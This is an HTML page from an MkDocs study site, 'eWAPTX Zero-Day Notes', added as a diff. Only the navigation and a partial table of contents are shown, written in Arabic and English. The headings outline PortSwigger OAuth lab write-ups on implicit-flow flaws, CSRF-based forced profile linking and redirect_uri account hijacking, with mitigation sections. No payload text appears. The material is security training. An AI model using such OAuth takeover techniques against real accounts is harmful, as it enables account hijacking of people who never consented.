@@ -1,0 +1,2854 @@
+
+<!doctype html>
+<html lang="ar" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../4-JWT%20port_swigger/">
+      
+      
+        <link rel="next" href="../6-SQL%20INJECTION/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>5 Oauth portswigger - eWAPTX Zero-Day Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/hacker_style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="rtl" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#oauth-20" class="md-skip">
+          انتقل إلى المحتوى
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="عنوان العارضة">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-header__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            eWAPTX Zero-Day Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              5 Oauth portswigger
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="بحث" placeholder="بحث" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="إبحث">
+        
+        <button type="reset" class="md-search__icon md-icon" title="مسح كلي" aria-label="مسح كلي" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            بدء البحث
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="تصفح" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-nav__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    eWAPTX Zero-Day Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome to MkDocs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-EWAPTX/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1 EWAPTX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-EWAPTX%20%28part%202%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2 EWAPTX (part 2)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-Enumeration%20%26%20Brute%20force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Enumeration — الفكرة ببساطة
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-JWT%20port_swigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ليه JWT vulnerabilities خطيرة جداً ؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#oauth-20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        يعني إيه OAuth 2.0 أصلاً ؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه OAuth مهم للمهاجمين؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طيب إيه فكرة OAuth الأساسية؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الفرق المهم جداً ⚠️
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        سيناريو بسيط يوضح الفكرة
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="سيناريو بسيط يوضح الفكرة">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خطوات تسجيل الدخول:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        فين المشكلة بقى؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        أهم نقطة لازم تفهمها قبل اللابات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-oauth-the-flexibility-trap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ليه الـ OAuth مليان ثغرات؟ (The Flexibility Trap)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. مرحلة الـ Identification (إزاي تعرف إنك قدام صيد ثمين؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. مرحلة الـ Recon (البحث عن الكنز المخفي) 🕵️‍♂️
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. مرحلة الـ Recon (البحث عن الكنز المخفي) 🕵️‍♂️">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه الروابط دي "منجم ذهب"؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        نصيحة "جيمي" ليك في الخطوة دي:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LABS :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#improper-implementation-of-the-implicit-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 الثغرة الأولى: التنفيذ الخاطئ للتدفق الضمني (Improper Implementation of the Implicit Flow)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="📌 الثغرة الأولى: التنفيذ الخاطئ للتدفق الضمني (Improper Implementation of the Implicit Flow)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#technical-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 المفهوم التقني (Technical Background)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-flaw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ أين تكمن الثغرة؟ (The Flaw)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ سيناريو الاستغلال (Exploitation Steps)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ كيفية الحماية (Mitigation)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-implicit-flow-authorization-code-with-pkce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        - الحل الجذري: التوقف عن استخدام الـ Implicit Flow تماماً واستخدام Authorization Code with PKCE.
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="- الحل الجذري: التوقف عن استخدام الـ Implicit Flow تماماً واستخدام Authorization Code with PKCE.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lab-forced-oauth-profile-linking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab: Forced OAuth profile linking :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Objective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-observation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Key Observation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#normal-oauth-linking-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔄 Normal OAuth Linking Flow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔄 Normal OAuth Linking Flow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-login-normally" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Login Normally
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-attach-social-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Attach Social Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-authenticate-with-social-media" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Authenticate With Social Media
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-idea" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 Attack Idea
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-steps_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Exploitation Steps
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🛠️ Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-login-normally" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — Login Normally
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-oauth-linking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — Start OAuth Linking
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-intercept-oauth-callback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — Intercept OAuth Callback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-copy-url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4 — Copy URL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-drop-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5 — Drop Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-logout" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6 — Logout
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#create-csrf-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 Create CSRF Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-result" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚨 Exploitation Result
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        👑 Account Takeover
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-step" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏁 Final Step
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root-cause" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔐 Root Cause
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Important Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧷 Payload Used
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🧷 Payload Used">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lab-oauth-account-hijacking-via-redirect_uri" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab: OAuth account hijacking via redirect_uri
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#objective_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Objective
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-observation_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Key Observation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#normal-oauth-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔄 Normal OAuth Flow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔄 Normal OAuth Flow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-user-logs-in" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — User Logs In
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-oauth-authorization-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — OAuth Authorization Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-oauth-server-redirects-back" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — OAuth Server Redirects Back
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-idea_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 Attack Idea
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-steps_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ Exploitation Steps
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🛠️ Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-complete-oauth-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Complete OAuth Login
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-observe-silent-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Observe Silent Authentication
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-find-authorization-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Find Authorization Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-test-redirect_uri" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Test redirect_uri
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-follow-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Follow Redirect
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#build-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 Build Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚨 Exploitation Flow
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚨 Exploitation Flow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#victim-visits-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Victim Visits Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#account-takeover_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔓 Account Takeover
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-step_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏁 Final Step
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root-cause_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔐 Root Cause
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-notes_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 Important Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload-used_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧷 Payload Used
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-SQL%20INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-Blind%20Sql%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    أولاً: ما هو Blind SQL Injection؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-NOSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📁 الدليل الشامل لأساسيات MongoDB واختبار اختراق NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9 NoSQL injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#oauth-20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        يعني إيه OAuth 2.0 أصلاً ؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه OAuth مهم للمهاجمين؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oauth_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طيب إيه فكرة OAuth الأساسية؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الفرق المهم جداً ⚠️
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        سيناريو بسيط يوضح الفكرة
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="سيناريو بسيط يوضح الفكرة">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خطوات تسجيل الدخول:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        فين المشكلة بقى؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        أهم نقطة لازم تفهمها قبل اللابات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-oauth-the-flexibility-trap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ليه الـ OAuth مليان ثغرات؟ (The Flexibility Trap)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. مرحلة الـ Identification (إزاي تعرف إنك قدام صيد ثمين؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. مرحلة الـ Recon (البحث عن الكنز المخفي) 🕵️‍♂️
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. مرحلة الـ Recon (البحث عن الكنز المخفي) 🕵️‍♂️">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه الروابط دي "منجم ذهب"؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        نصيحة "جيمي" ليك في الخطوة دي:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LABS :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#improper-implementation-of-the-implicit-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 الثغرة الأولى: التنفيذ الخاطئ للتدفق الضمني (Improper Implementation of the Implicit Flow)
+      
+    </span>
+  </a>
+  
